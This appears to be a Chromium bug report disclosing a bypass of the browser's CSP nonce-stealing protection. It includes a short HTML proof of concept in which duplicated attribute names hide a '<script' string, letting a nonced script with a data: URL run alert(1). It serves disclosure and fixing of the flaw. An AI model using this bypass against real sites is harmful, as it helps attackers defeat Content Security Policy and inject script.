Steps to reproduce the problem:
As stated in https://github.com/w3c/webappsec-csp/issues/98 ; Chromium contains a protection against nonce stealing prevention, with detecting "<script" or "<style" in attribute name or value.

The prevention could be bypassed by duplicate attribute's name, for example:

<!-- the following will not execute -->
<meta http-equiv=Content-Security-Policy
      content="script-src 'nonce-abcd'">
<script src=data:,alert(1) nonce="abcd" >
</script>

<!-- the following will execute -->
<meta http-equiv=Content-Security-Policy
      content="script-src 'nonce-abcd'">
<script src=data:,alert(1) x="" x="<script" nonce="abcd" >
</script>

What is the expected behavior?

What went wrong?
The prevention should detect "<script" string even if it is within a duplicated attribute.
